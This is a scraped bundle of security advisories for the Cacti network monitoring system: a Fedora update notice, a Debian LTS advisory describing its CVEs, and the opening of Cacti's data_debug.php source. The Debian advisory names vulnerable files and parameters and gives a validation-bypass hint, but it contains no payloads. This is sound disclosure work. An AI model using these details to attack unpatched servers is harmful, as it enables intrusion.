* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-RBEOAFKRARQHTDIYSL723XAFJ2Q6624X.mbox.gz?message=RBEOAFKRARQHTDIYSL723XAFJ2Q6624X "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/RBEOAFKRARQHTDIYSL723XAFJ2Q6624X/#RBEOAFKRARQHTDIYSL723XAFJ2Q6624X)

# [SECURITY] Fedora 39 Update: cacti-spine-1.2.27-1.fc39

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

30 May
2024

30 May
'24

9:14 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2024-27a594f71d
2024-05-31 02:13:07.316161
--------------------------------------------------------------------------------

Name : cacti-spine
Product : Fedora 39
Version : 1.2.27
Release : 1.fc39
URL : <https://cacti.net>
Summary : Threaded poller for Cacti written in C
Description :
Spine is a supplemental poller for Cacti that makes use of pthreads to achieve
excellent performance.

--------------------------------------------------------------------------------
Update Information:

Update cacti and cacti-spine to version 1.2.27. This includes the upstream fixes
for many CVEs, including a critical remote code execution bug.
<https://github.com/Cacti/cacti/blob/release/1.2.27/CHANGELOG>
<https://github.com/Cacti/spine/blob/release/1.2.27/CHANGELOG>
--------------------------------------------------------------------------------
ChangeLog:

\* Wed May 22 2024 Carl George carlwgeorge@fedoraproject.org - 1.2.27-1
- Update to version 1.2.27
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2255602 - CVE-2023-49084 cacti: RCE when managing links [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2255602>
[ 2 ] Bug #2255606 - CVE-2023-49086 cacti: XSS when adding new devices [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2255606>
[ 3 ] Bug #2255667 - CVE-2023-49085 CVE-2023-49088 CVE-2023-50250 CVE-2023-51448 cacti: Multiple vulnerabilities [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2255667>
[ 4 ] Bug #2280482 - CVE-2024-34340 cacti: authentication bypass when using older password hashes [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2280482>
[ 5 ] Bug #2280497 - CVE-2024-29894 cacti: XSS vulnerability when using JavaScript based messaging API [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2280497>
[ 6 ] Bug #2280500 - CVE-2024-31458 CVE-2024-31459 CVE-2024-31460 cacti: multiple vulnerabilities [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2280500>
[ 7 ] Bug #2280503 - CVE-2024-31443 CVE-2024-31444 CVE-2024-31445 cacti: multiple vulnerabilties [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2280503>
[ 8 ] Bug #2280506 - CVE-2024-25641 cacti: remote code execution vulnerability [fedora-all]
<https://bugzilla.redhat.com/show_bug.cgi?id=2280506>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2024-27a594f71d' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/RBEOAFKRARQHTDIYSL723XAFJ2Q6624X/#RBEOAFKRARQHTDIYSL723XAFJ2Q6624X)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from lists.debian.org_111ce00f_20250114_234208.html ===


---

[[Date Prev](msg00017.html)][[Date Next](msg00019.html)]
[[Thread Prev](msg00017.html)][[Thread Next](msg00019.html)]
[[Date Index](maillist.html#00018)]
[[Thread Index](threads.html#00018)]

# [SECURITY] [DLA 3765-1] cacti security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3765-1] cacti security update
* *From*: Sylvain Beucler <beuc@beuc.net>
* *Date*: Mon, 18 Mar 2024 19:26:19 +0100
* *Message-id*: <[[🔎]](/msgid-search/ZfiHS0jbmhLYtAEo%40mail.beuc.net) [ZfiHS0jbmhLYtAEo@mail.beuc.net](msg00018.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-3765-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Sylvain Beucler
March 18, 2024                                <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : cacti
Version        : 1.2.2+ds1-2+deb10u6
CVE ID         : CVE-2023-39357 CVE-2023-39360 CVE-2023-39361 CVE-2023-39362
                 CVE-2023-39364 CVE-2023-39365 CVE-2023-39513 CVE-2023-39515
                 CVE-2023-39516 CVE-2023-49084 CVE-2023-49085 CVE-2023-49086
                 CVE-2023-49088
Debian Bug     : 1059254

Multiple vulnerabilities were found in Cacti, a network monitoring
system. An attacker could manipulate the database, execute code
remotely, launch DoS (denial-of-service) attacks or impersonate Cacti
users, in some situations.

CVE-2023-39357

    When the column type is numeric, the sql_save function directly
    utilizes user input. Many files and functions calling the sql_save
    function do not perform prior validation of user input, leading to
    the existence of multiple SQL injection vulnerabilities in
    Cacti. This allows authenticated users to exploit these SQL
    injection vulnerabilities to perform privilege escalation and
    remote code execution.

CVE-2023-39360

    Stored Cross-Site-Scripting (XSS) Vulnerability allows an
    authenticated user to poison data. The vulnerability is found in
    `graphs_new.php`. Several validations are performed, but the
    `returnto` parameter is directly passed to `form_save_button`. In
    order to bypass this validation, returnto must contain `host.php`.

CVE-2023-39361

    SQL injection discovered in graph_view.php. Since guest users can
    access graph_view.php without authentication by default, if guest
    users are being utilized in an enabled state, there could be the
    potential for significant damage. Attackers may exploit this
    vulnerability, and there may be povssibilities for actions such as
    the usurpation of administrative privileges or remote code
    execution.

CVE-2023-39362

    An authenticated privileged user, can use a malicious string in
    the SNMP options of a Device, performing command injection and
    obtaining remote code execution on the underlying server. The
    `lib/snmp.php` file has a set of functions, with similar behavior,
    that accept in input some variables and place them into an `exec`
    call without a proper escape or validation.

CVE-2023-39364

    Users with console access can be redirected to an arbitrary
    website after a change password performed via a specifically
    crafted URL. The `auth_changepassword.php` file accepts `ref` as a
    URL parameter and reflects it in the form used to perform the
    change password. It's value is used to perform a redirect via
    `header` PHP function. A user can be tricked in performing the
    change password operation, e.g., via a phishing message, and then
    interacting with the malicious website where the redirection has
    been performed, e.g., downloading malwares, providing credentials,
    etc.

CVE-2023-39365

    Issues with Cacti Regular Expression validation combined with the
    external links feature can lead to limited SQL Injections and
    subsequent data leakage.

CVE-2023-39513

    Stored Cross-Site-Scripting (XSS) Vulnerability which allows an
    authenticated user to poison data stored in the _cacti_'s
    database. The script under `host.php` is used to monitor and
    manage hosts in the _cacti_ app, hence displays useful information
    such as data queries and verbose logs.

CVE-2023-39515

    Stored Cross-Site-Scripting (XSS) Vulnerability allows an
    authenticated user to poison data stored in the cacti's
    database. These data will be viewed by administrative cacti
    accounts and execute JavaScript code in the victim's browser at
    view-time. The script under `data_debug.php` displays data source
    related debugging information such as _data source paths, polling
    settings, meta-data on the data source.

CVE-2023-39516

    Stored Cross-Site-Scripting (XSS) Vulnerability which allows an
    authenticated user to poison data stored in the _cacti_'s
    database. These data will be viewed by administrative _cacti_
    accounts and execute JavaScript code in the victim's browser at
    view-time. The script under `data_sources.php` displays the data
    source management information (e.g. data source path, polling
    configuration etc.) for different data visualizations of the
    _cacti_ app.

CVE-2023-49084

    While using the detected SQL Injection and insufficient processing
    of the include file path, it is possible to execute arbitrary code
    on the server. Exploitation of the vulnerability is possible for
    an authorized user. The vulnerable component is the `link.php`.

CVE-2023-49085

    It is possible to execute arbitrary SQL code through the
    `pollers.php` script. An authorized user may be able to execute
    arbitrary SQL code. The vulnerable component is the `pollers.php`.

CVE-2023-49086

    Bypassing an earlier fix (CVE-2023-39360) that leads to a DOM XSS
    attack. Exploitation of the vulnerability is possible for an
    authorized user. The vulnerable component is the `graphs_new.php`.

CVE-2023-49088

    The fix applied for CVE-2023-39515 in version 1.2.25 is incomplete
    as it enables an adversary to have a victim browser execute
    malicious code when a victim user hovers their mouse over the
    malicious data source path in `data_debug.php`.

For Debian 10 buster, these problems have been fixed in version
1.2.2+ds1-2+deb10u6.

We recommend that you upgrade your cacti packages.

For the detailed security status of cacti please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/cacti>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEE1vEOfV7HXWKqBieIDTl9HeUlXjAFAmX4gD8ACgkQDTl9HeUl
XjBYcxAAmAYZrVh2A/WqKiYrOmjuBfrzZYoTsvHQ5vkFopsGmYxOX6UtiH2O0uCk
ECaq6eBEwUwkLz1DB8JP0CRoVGsRcs7aN9x0JUno+55/WfJ6BnxsBp7/0x/18IRx
FxbIrD4ndx2HhiU1KDzmsFNYo1usvY2AuoBU7HrWxmKculgb9Y1al4/K9PU2TKLY
D/J0jf1EAYQC8ieEd0bB4RocIbKUfgS/9Mzv+9zBZ0snpmnv+l1YmWTUbcI0lGsu
F8lw8Ap4AqE0SaPyj3PgkOAXAslcjQGTj2ZNbdL/8O38rJvyrA4KSnsvPOa2aJDH
3MHdYb6PyaCzuL7Yrp5hhAfQ41GDV1OomRAm7b9VZlDAu7nk2VGLG8hnCbVfZtay
+H7pPoONw3JMGL56ePNf1URjJgT3vwvseIL772BLnRVUpLM1NW+O0fTbxWf/uKbq
y51602YnA6jUByCqVrh1xRrx+gYR6QcS1ygcEkkA5qEFo/U2YorZn5JlSpZBPVM9
4fyPS2SKv/c+Dzq1Y+6dsihg55mVyB4cErn7HXPXhsExvkXE0fPXXlj86qvMX1Hd
xsAg5oCvBrIvPgYE7SGOKYfyhxihbkyWMLisXZBRWeW68CgQnOgV3GxpCl9IJIP4
CbhlOcW/+kXPU2aTEcVKf+8Wx/13ZG2C1kBjiQVdgtWxmRXXTIY=
=3CrP
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_cdd52306_20250114_234202.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCacti%2Fcacti%2Fblob%2F5f6f65c215d663a775950b2d9db35edbaf07d680%2Fdata_debug.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCacti%2Fcacti%2Fblob%2F5f6f65c215d663a775950b2d9db35edbaf07d680%2Fdata_debug.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Cacti%2Fcacti)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Cacti](/Cacti)
/
**[cacti](/Cacti/cacti)**
Public

* [Notifications](/login?return_to=%2FCacti%2Fcacti) You must be signed in to change notification settings
* [Fork
  406](/login?return_to=%2FCacti%2Fcacti)
* [Star
   1.7k](/login?return_to=%2FCacti%2Fcacti)

* [Code](/Cacti/cacti)
* [Issues
  144](/Cacti/cacti/issues)
* [Pull requests
  1](/Cacti/cacti/pulls)
* [Discussions](/Cacti/cacti/discussions)
* [Actions](/Cacti/cacti/actions)
* [Projects
  0](/Cacti/cacti/projects)
* [Wiki](/Cacti/cacti/wiki)
* [Security](/Cacti/cacti/security)
* [Insights](/Cacti/cacti/pulse)

Additional navigation options

* [Code](/Cacti/cacti)
* [Issues](/Cacti/cacti/issues)
* [Pull requests](/Cacti/cacti/pulls)
* [Discussions](/Cacti/cacti/discussions)
* [Actions](/Cacti/cacti/actions)
* [Projects](/Cacti/cacti/projects)
* [Wiki](/Cacti/cacti/wiki)
* [Security](/Cacti/cacti/security)
* [Insights](/Cacti/cacti/pulse)

## Files

 5f6f65c
## Breadcrumbs

1. [cacti](/Cacti/cacti/tree/5f6f65c215d663a775950b2d9db35edbaf07d680)
/
# data\_debug.php

Copy path Blame  Blame
## Latest commit

## History

[History](/Cacti/cacti/commits/5f6f65c215d663a775950b2d9db35edbaf07d680/data_debug.php)1241 lines (1056 loc) · 35.4 KB 5f6f65c
## Breadcrumbs

1. [cacti](/Cacti/cacti/tree/5f6f65c215d663a775950b2d9db35edbaf07d680)
/
# data\_debug.php

Top
## File metadata and controls

* Code
* Blame

1241 lines (1056 loc) · 35.4 KB[Raw](https://github.com/Cacti/cacti/raw/5f6f65c215d663a775950b2d9db35edbaf07d680/data_debug.php)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000<?php/\* +-------------------------------------------------------------------------+ | Copyright (C) 2004-2023 The Cacti Group | | | | This program is free software; you can redistribute it and/or | | modify it under the terms of the GNU General Public License | | as published by the Free Software Foundation; either version 2 | | of the License, or (at your option) any later version. | | | | This program is distributed in the hope that it will be useful, | | but WITHOUT ANY WARRANTY; without even the implied warranty of | | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the | | GNU General Public License for more details. | +-------------------------------------------------------------------------+ | Cacti: The Complete RRDtool-based Graphing Solution | +-------------------------------------------------------------------------+ | This code is designed, written, and maintained by the Cacti Group. See | | about.php and/or the AUTHORS file for specific developer information. | +-------------------------------------------------------------------------+ | http://www.cacti.net/ | +-------------------------------------------------------------------------+\*/
include\_once('include/auth.php');include\_once('lib/rrd.php');include\_once('lib/dsdebug.php');
$actions = array( 1 => \_\_('Run Check'), 2 => \_\_('Delete Check'));
ini\_set('memory\_limit', '-1');
set\_default\_action();
validate\_request\_vars();
switch (get\_request\_var('action')) { case 'actions': form\_actions();
 break; case 'run\_debug': $id = get\_filter\_request\_var('id');
 if ($id > 0) { $selected\_items = array($id); debug\_delete($selected\_items); debug\_rerun($selected\_items); raise\_message('rerun', \_\_('Data Source debug started.'), MESSAGE\_LEVEL\_INFO); header('Location: data\_debug.php?action=view&id=' . get\_filter\_request\_var('id')); } else { raise\_message('repair\_error', \_\_('Data Source debug received an invalid Data Source ID.'), MESSAGE\_LEVEL\_ERROR); }
 break; case 'run\_repair': $id = get\_filter\_request\_var('id');
 if ($id > 0) { if (dsdebug\_run\_repair($id)) { raise\_message('repair', \_\_('All RRDfile repairs succeeded.'), MESSAGE\_LEVEL\_INFO); } else { raise\_message('repair', \_\_('One or more RRDfile repairs failed. See Cacti log for errors.'), MESSAGE\_LEVEL\_ERROR); }
 $selected\_items = array($id);
 debug\_delete($selected\_items); debug\_rerun($selected\_items);
 raise\_message('rerun', \_\_('Automatic Data Source debug being rerun after repair.'), MESSAGE\_LEVEL\_INFO);
 header('Location: data\_debug.php?action=view&id=' . get\_filter\_request\_var('id')); } else { raise\_message('repair\_error', \_\_('Data Source repair received an invalid Data Source ID.'), MESSAGE\_LEVEL\_ERROR); }
 break; case 'view': $id = get\_filter\_request\_var('id');
 $debug\_status = debug\_process\_status($id);
 if ($debug\_status == 'notset') { $selected\_items = array($id); debug\_delete($selected\_items); debug\_rerun($selected\_items); $debug\_status = 'waiting'; }
